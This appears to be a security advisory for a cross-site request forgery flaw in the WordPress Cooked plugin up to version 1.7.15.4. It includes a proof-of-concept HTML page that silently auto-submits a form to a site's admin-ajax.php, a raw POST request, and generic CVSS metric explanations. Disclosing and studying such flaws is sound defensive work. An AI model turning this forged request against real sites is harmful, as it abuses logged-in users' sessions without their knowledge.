# WordPress Cooked Plugin <= 1.7.15.4 - Cross-Site Request Forgery to Get Recipe IDs

Moderate

## Package

No package listed

## Affected versions

<= 1.7.15.4

## Patched versions

1.8.0

## Description

## Description:

The Cooked plugin for WordPress is vulnerable to Cross-Site Request Forgery (CSRF) in versions up to, and including, 1.7.15.4 due to missing or incorrect nonce validation on the AJAX action handler. This vulnerability could allow an attacker to trick users into performing an action they didn't intend to perform under their current authentication.

## Steps to reproduce:

```
<html>
	<!-- CSRF PoC - Get Recipe IDs -->
	<body>
		<form action="https://target.tld/wp-admin/admin-ajax.php" method="POST">
			<input type="hidden" name="action" value="cooked&#95;get&#95;recipe&#95;ids" />
			<input type="submit" value="Submit request" />
		</form>
		<script>
			history.pushState('', '', '/');
			document.forms[0].submit();
		</script>
	</body>
</html>

```
## PoC request:

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: target.tld
Cookie: [cookies]
Content-Length: 28
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0

action=cooked_get_recipe_ids

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
